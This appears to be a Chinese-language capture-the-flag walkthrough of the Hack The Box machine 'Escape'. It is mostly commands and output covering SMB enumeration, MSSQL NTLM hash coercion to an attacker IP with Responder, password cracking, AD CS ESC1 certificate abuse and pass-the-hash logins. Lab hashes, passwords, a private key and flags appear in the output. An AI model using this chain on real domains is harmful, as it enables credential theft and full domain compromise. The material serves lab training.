###### tags: `Hack the box` `HTB` `Medium`

# Escape
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.228.253 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.228.253:53
Open 10.129.228.253:88
Open 10.129.228.253:135
Open 10.129.228.253:139
Open 10.129.228.253:389
Open 10.129.228.253:445
Open 10.129.228.253:593
Open 10.129.228.253:636
Open 10.129.228.253:3268
Open 10.129.228.253:3269
Open 10.129.228.253:464
Open 10.129.228.253:1433
Open 10.129.228.253:5985
Open 10.129.228.253:9389
Open 10.129.228.253:49667
Open 10.129.228.253:49690
Open 10.129.228.253:49689
Open 10.129.228.253:49710
Open 10.129.228.253:49717

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-05-27 15:00:40Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack Microsoft Windows RPC
49717/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

smbclient，登入`Public`
```
┌──(kali㉿kali)-[~/htb]
└─$ smbclient -N -L 10.129.228.253 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share
        

┌──(kali㉿kali)-[~/htb]
└─$ smbclient -N //10.129.228.253/Public

smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
  
smb: \> get "SQL Server Procedures.pdf"
```

`SQL Server Procedures.pdf`得database的帳號`PublicUser`密碼`GuestUserCantWrite1`
```
Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

登入database，參考[1433 - Pentesting MSSQL - Microsoft SQL Server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack)
```
┌──(kali㉿kali)-[~/htb]
└─$ impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.129.228.253 

┌──(kali㉿kali)-[~/htb]
└─$ sudo responder -I tun0

SQL (PublicUser  guest@master)> exec master.dbo.xp_dirtree '\\10.10.14.30\any\thing'
subdirectory   depth   
------------   -----
```

responder收到hash
```
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:e6f9fa5390e516f8:91A7949C7ACEFB5BE55D6FF4E52163F7:010100000000000000BD19D3E2AFDA01AB44FCF97E682D5D000000000200080045005A004700350001001E00570049004E002D0033004300430049005900480046003000420033004B0004003400570049004E002D0033004300430049005900480046003000420033004B002E0045005A00470035002E004C004F00430041004C000300140045005A00470035002E004C004F00430041004C000500140045005A00470035002E004C004F00430041004C000700080000BD19D3E2AFDA0106000400020000000800300030000000000000000000000000300000B59A07C23D053A96E8A549702B7F6AF799754855339DBE3714FB7D29F77D83400A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330030000000000000000000
```

john破
```
┌──(kali㉿kali)-[~/htb]
└─$ john sql_svc --wordlist=/home/kali/rockyou.txt

REGGIE1234ronnie (sql_svc) 
```

登入，在`C:\SQLServer\Logs\ERRORLOG.BAK`可以看到`Ryan.Cooper`的帳號密碼
```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.228.253 -u sql_svc -p REGGIE1234ronnie

*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK
...
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
...
```

evil-winrm登入，可在`C:\Users\Ryan.Cooper\DEsktop`得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.228.253 -u Ryan.Cooper -p NuclearMosquito3

*Evil-WinRM* PS C:\Users\Ryan.Cooper\DEsktop> type user.txt
04cf44eee46f8b6132c8407750d2931a
```

透過rustscan結果可以試`AD CS Domain Escalation`
使用[Certify](https://github.com/GhostPack/Certify)
```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\DEsktop> upload Certify.exe
*Evil-WinRM* PS C:\Users\Ryan.Cooper\DEsktop> .\Certify.exe cas
[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'


[*] Root CAs

    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb



[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb


[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        UserAuthentication
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator
        
*Evil-WinRM* PS C:\Users\Ryan.Cooper\DEsktop> .\Certify.exe find /vulnerable

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.2865906
```

`Template Name`是`UserAuthentication`
`msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT`可判斷為`ESC1`

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\DEsktop> ./Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 13

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvbMxMait4aFEIDbO3OdreyJcsiUcKh/AxLJGCiAWNL0mucRU
PweH6q3E3PKhPwAfBv3f3Kzz5LYpsWxvsdjuiR8Br7YS85edXAalnmTpoEK8thZD
fkduLNfuXt4gu3iwRWZfsAjqCl6JDT5iZ60doAkEcd1bTFwySQlqNmKFjobyV1Uj
OfPUzuMmRBkJIRspXFviRs3CJAkpXAmzXwd0HgG5MpCU/pDMwSzt60hbECgzHBoH
ENpLF2GPmEhkQPL7d3Qnbv6HtSHzwTsiLCYhhjkgM2naql1pmYagirC9Z3FDOK7M
vbi/GeRU6Stj7TKVYVWRlLXdYU6wKlAf1DmW8QIDAQABAoIBAQC83Qq9RhLX8JbC
+844YK7BiRSAyDGiPrrNGjBhJFD3cNp9WNoHZpgLLbYxw96FurkpXNjj+81Wh4Y6
/pq1liTmn9gt+DgmDWy9kmCRsiZnSApZvxCzSKqIOvM3wC8WdrIIZkQeHsHkUPpi
FRoj3lcAXfnu41NiUug9jwIP40bU/g66swkHwInWTDfaIztWdZy/UxeSjOOZ7Tlg
LupYqoKYPiVdp2lCRHB6i8sgp1bCh4RsX4b/eU1XshNzACEpTxAafHdqGcN6EWrX
r7hvff9ysV0eTRVB3EuzJ/m5hXkwwFyV4HmYAPbywR9KvtNGrR0AuooH9/4SYDjs
EdGXZV+BAoGBANyN/heAMFhzEISHwe4MbVHqRj0NU4OlZW2eBUS36x5Tt8NcN4Gw
UZdJq9xijoS+fXtOQ2fiFOpxdk6u5o6OzmL7tuX6OJa47Gslf8uYQq7VVffgtZ2N
UwSvutJ0cpbMrou6nUYa2mZc7uQZkVA/aHBzqCAWjFdfj+crs752WJL/AoGBANwv
yIeqaKSSOcegnNQLEhUCaCsqhPRkdXRgUrw2yRzniiBqcul1faj6eCHOlfaMDiCv
8QmHaMutVCvMjdMFsl6RCKRdeo6Zsc+CZESAVwXFqbfkjh6r2YBZNXgT/GnwSWGn
Qs6bW1ZmnDpmhb7IyB75IsrAEaUaXC7E0J55aQYPAoGAK2m3riCJY5+ijLO8NIM1
sX4PvUy2N5+Cy4TjPJeHLD0GWun38wslxEW4EnVD4FUulerd0cDqpQsYYnyC3WS2
sz0gzzvlj6Vuw9hpw0WBOrC7b0NH/G8o/C8q8uoA9DXt1YsyEe6PNr7sNvHhbI5O
nHPnkAlgLoKc7L/pbYAWBzkCgYAge1wVx2nQfVHQxTzdexSbzNMZKxiaBQfetyb9
ZQeeH/ocdheloRN8jhaSxisRR+/9mnbwdO1cvqEgJPj3HGwHz1V7Cd8+kiXM+utX
v6cWzuYOnsToeWmIqaBdqnUeG7h3k3kjiX+b6184rk8kqfH7v70GM/dmZ9EZhSdR
eY+ouQKBgEttjkzjNmMx34ZojnhDlO5ICrY2tgnfHFCbrVSxiaLHlowz2e81o+5j
1sQoemDqRcSCDV8Jsx4YHFOXUFxKKiOjwsN3zn3Iy7VahuLC+F99yjNoR7Ps8NmB
eZD+KZq2IR5dkQPgbF3jrphOPD5V45ASohev7uyRnI0efdEm5ql4
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA2EXLXIX0EziwAAAAAADTANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjQwNTI3MTYzNTM0WhcNMzQwNTI1
MTYzNTM0WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC9szExqK3hoUQgNs7c52t7Ilyy
JRwqH8DEskYKIBY0vSa5xFQ/B4fqrcTc8qE/AB8G/d/crPPktimxbG+x2O6JHwGv
thLzl51cBqWeZOmgQry2FkN+R24s1+5e3iC7eLBFZl+wCOoKXokNPmJnrR2gCQRx
3VtMXDJJCWo2YoWOhvJXVSM589TO4yZEGQkhGylcW+JGzcIkCSlcCbNfB3QeAbky
kJT+kMzBLO3rSFsQKDMcGgcQ2ksXYY+YSGRA8vt3dCdu/oe1IfPBOyIsJiGGOSAz
adqqXWmZhqCKsL1ncUM4rsy9uL8Z5FTpK2PtMpVhVZGUtd1hTrAqUB/UOZbxAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFBQNV/KHflpDw3qR2sFHetYz6SUY
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAJ1ENlg7eH3vHZp+ghyglcbXxzTyd9MJYBfZL52pDwzu3MZnsSyyP0EhW
ysFHp7rw/9jUfslSWBdi7ctJQKc03SfwBELGM4NldLbeTHps3tvlJydk4aMhqFs5
tFPqgJJjxl7MHz10EthVETM1tvqZ7Ni9Iqv1lY0FjFnCDhtxH9oI1puvBBNfHVvJ
3RnOhI9LB4ZwOmQ4M3RG9ZCu7wKh/GZcn8taChDRyElCnyJ95jy/PMNMp3KPX22T
KOhMPT1KbqMK7DW8bCehRU2yU3KtTRecurNP/zOSne8kJYzvEPNMsk1PCsw0W2ct
mHV0L0mBOpLxOhD13PjgF2vcfC1Sbg==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:13.2054948
```

用`Certipy`
```
┌──(kali㉿kali)-[~/htb/Certipy]
└─$ sudo ntpdate -u 10.129.228.253

┌──(kali㉿kali)-[~/htb/Certipy]
└─$ certipy-ad auth  -pfx cert.pfx -dc-ip 10.129.228.253 -username Administrator -domain sequel.htb

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

evil-winrm登入，在`C:\Users\Administrator\Desktop`得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.228.253 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
3997e139fe0922196b431494e391c40d
```